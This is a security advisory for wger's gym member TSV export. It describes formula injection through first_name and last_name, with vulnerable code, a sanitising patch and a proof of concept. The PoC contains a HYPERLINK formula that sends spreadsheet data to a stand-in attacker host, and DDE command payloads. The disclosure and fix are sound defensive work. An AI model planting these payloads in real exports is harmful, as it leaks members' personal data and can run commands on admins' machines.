# [H] wger: CSV/TSV formula injection in gym member export (first_name/last_name)

## Summary
Severity: High
Advisory: GHSA-xq9m-hmp9-fw87
CWE: CWE-1236
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-xq9m-hmp9-fw87
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0 <2.6

## Details
### Summary

The gym member TSV export endpoint in wger writes `first_name` and `last_name` profile fields verbatim to TSV cells with no formula-prefix sanitization. Any gym member (including newly self-registered users) can pre-load a spreadsheet formula into their own profile. When a gym admin later exports the member list and opens the file in Excel, LibreOffice Calc, or Google Sheets, the formula executes in the admin's local spreadsheet context — enabling data exfiltration and, on legacy Excel with DDE enabled, arbitrary local code execution.

### Details

**File**: `wger/gym/views/export.py`, approximately line 73

```python
# VULNERABLE - wger/gym/views/export.py
writer.writerow([
    user.id,
    gym.name,
    user.username,
    user.email,
    user.first_name,   # written verbatim - no formula prefix sanitization
    user.last_name,    # written verbatim
    ...
])
```

Python's `csv.writer` does not escape spreadsheet formula triggers (`=`, `+`, `-`, `@`, `\t`, `\r`). Any gym member can set their `first_name` to `=HYPERLINK("http://attacker.example/?p="&A1,"click")` via the profile edit endpoint. The string is stored in the database and reproduced without modification in every subsequent TSV export. When a gym admin opens the resulting file in a formula-evaluating spreadsheet application, the formula executes in their local context — outside the wger server boundary.

**Affected endpoints**:
- `GET /en/gym/export/users/<gym_pk>` -> `wger.gym.views.export` (TSV download)
- Profile fields injected via profile edit endpoint (first_name/last_name)

**Suggested patch**:

```diff
--- a/wger/gym/views/export.py
+++ b/wger/gym/views/export.py
+FORMULA_PREFIXES = ('=', '+', '-', '@', '\t', '\r')
+
+def sanitise_cell(value):
+    """Prefix formula-triggering strings with a single-quote to neutralise."""
+    s = str(value) if value is not None else ''
+    if s and s[0] in FORMULA_PREFIXES:
+        return "'" + s
+    return s
+
 writer.writerow([
     user.id,
     gym.name,
     user.username,
     user.email,
-    user.first_name,
-    user.last_name,
+    sanitise_cell(user.first_name),
+    sanitise_cell(user.last_name),
     ...
 ])
```

Prepending `'` to any cell value beginning with `=`, `+`, `-`, or `@` is the standard OWASP-recommended mitigation for CSV/TSV formula injection. Apply `sanitise_cell` to all exported user-supplied fields, or subclass `csv.writer` to apply the sanitization globally for future fields.

### PoC

Tested on `wger/server:latest` Docker image. Test users: gym member (any registered user) and trainer1 (`manage_gym` permission).

**Step 1** - Inject formula payload into profile (any gym member, including self-registered):

```
POST /en/user/<user_pk>/overview HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=[member_session]

first_name=%3DHYPERLINK%28%22http%3A%2F%2Fattacker.example%2Fx%3Fp%3D%22%26A1%2C%22click%22%29
```

URL-decoded value: `=HYPERLINK("http://attacker.example/x?p="&A1,"click")`

**Step 2** - Gym admin exports member list:

```
GET /en/gym/export/users/2 HTTP/1.1
Host: target
Cookie: sessionid=[trainer_session]

-> 200 OK
Content-Disposition: attachment; filename=User-data-gym-2-[date].csv

[... header row ...]
2	TestGym1	alice	alice@test.local	=HYPERLINK("http://attacker.example/x?p="&A1,"click")	...
```

**Step 3** - Admin opens TSV in Excel, LibreOffice Calc, or Google Sheets:

- Formula cell renders as clickable "click" hyperlink.
- On click (or on file-open with DDE-enabled Excel): browser issues `GET http://attacker.example/x?p=[cell_A1_contents]`.
- Attacker server receives exfiltrated spreadsheet data.

Confirmed during testing: both `=cmd|calc.exe!A1` (DDE) and `=HYPERLINK(attacker.com)` payloads appear raw in the exported TSV response body.

Reproducibility: 2/2 runs after clean-baseline database reset.

### Impact

Any gym member (including self-registered users) can inject a spreadsheet formula into their own `first_name` or `last_name`. When a gym administrator with `manage_gym` permission later performs the routine member export and opens the TSV in a formula-evaluating spreadsheet application, the formula executes in the admin's local spreadsheet context:

- **Data exfiltration**: other members' email addresses, phone numbers, and any PII displayed in adjacent cells can be posted to an attacker-controlled URL via `HYPERLINK` or `WEBSERVICE` functions.
- **Local code execution** (legacy Excel with DDE enabled): payloads like `=cmd|'/c calc.exe'!A1` execute arbitrary commands on the admin's workstation.
- **Phishing**: formulas can display admin-trusted text while silently redirecting on click.

**Affected deployments**: every wger instance that delegates `manage_gym` to gym admins and where those admins periodically export the member list. The payload is stored persistently and survives indefinitely until the admin performs the export.

**Severity**: High (CVSS 7.4). Network-reachable, stored payload triggered by legitimate admin workflow, scope unchanged (admin's local context), high confidentiality and integrity loss.

This is a standalone CWE-1236 vulnerability, independent of the `None != None` cluster of access-control findings. The fix is a small, local sanitization helper.

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-xq9m-hmp9-fw87
- https://github.com/wger-project/wger
